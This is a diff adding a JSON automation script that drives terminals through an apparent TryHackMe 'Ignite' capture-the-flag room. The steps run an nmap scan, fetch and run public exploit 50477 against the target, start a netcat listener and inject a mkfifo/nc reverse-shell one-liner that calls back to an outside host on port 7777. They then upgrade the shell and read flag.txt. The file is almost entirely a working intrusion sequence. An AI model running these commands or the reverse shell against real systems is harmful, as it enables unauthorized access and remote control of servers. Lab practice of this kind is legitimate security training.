@@ -1,0 +1,108 @@
+{
+  "type": "task",
+  "steps": [
+
+    {
+      "action": "command",
+      "terminal": "terminal2",
+      "command": "cd "
+    },
+    {
+      "action": "command",
+      "terminal": "terminal2",
+      "command": "cd THM"
+    },
+    {
+      "action": "command",
+      "terminal": "terminal2",
+      "command": "cd ignite"
+    },
+    {
+      "action": "command",
+      "terminal": "terminal2",
+      "command": "export IP=10.146.191.82"
+    },
+    {
+      "action": "command",
+      "terminal": "terminal2",
+      "command": "nmap -sC -sV $IP -oN scan_result"
+    },
+    {
+      "action": "interactive_start",
+      "terminal": "terminal2",
+      "command": "searchsploit -m 50477"
+    },
+    {
+      "action": "interactive_input",
+      "terminal": "terminal2",
+      "input": "y",
+      "idle_seconds":30
+    },
+    {
+      "action": "interactive_start",
+      "terminal": "terminal2",
+      "command": "python3 50477.py -u http://$IP",
+      "idle_seconds":35
+    },
+    {
+      "action": "interactive_input",
+      "terminal": "terminal2",
+      "input": "id",
+      "idle_seconds":15
+
+    },
+    {
+      "action": "command",
+      "terminal": "terminal3",
+      "command": "cd"
+    },
+    {
+      "action": "command",
+      "terminal": "terminal3",
+      "command": "cd THM/ignite"
+    },
+    {
+      "action": "interactive_start",
+      "terminal": "terminal3",
+      "command": "nc -lvnp 7777"
+    },
+    {
+      "action": "interactive_input",
+      "terminal": "terminal2",
+      "input": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.134.36 7777 >/tmp/f"
+    },
+    {
+      "action": "interactive_input",
+      "terminal": "terminal3",
+      "input": "python -c \"import pty; pty.spawn('/bin/bash')\"",
+      "idle_seconds": 5
+    },
+    {
+      "action": "interactive_input",
+      "terminal": "terminal3",
+      "input": "id",
+      "idle_seconds": 15
+    },
+    {
+      "action": "interactive_input",
+      "terminal": "terminal3",
+      "input": "cd /home/www-data",
+      "idle_seconds":15
+
+    },
+    {
+      "action": "interactive_input",
+      "terminal": "terminal3",
+      "input": "ls",
+      "idle_seconds":15
+    },
+    {
+      "action": "interactive_input",
+      "terminal": "terminal3",
+      "input": "cat flag.txt",
+      "idle_seconds": 15
+    }
+  ]
+}
+
+  
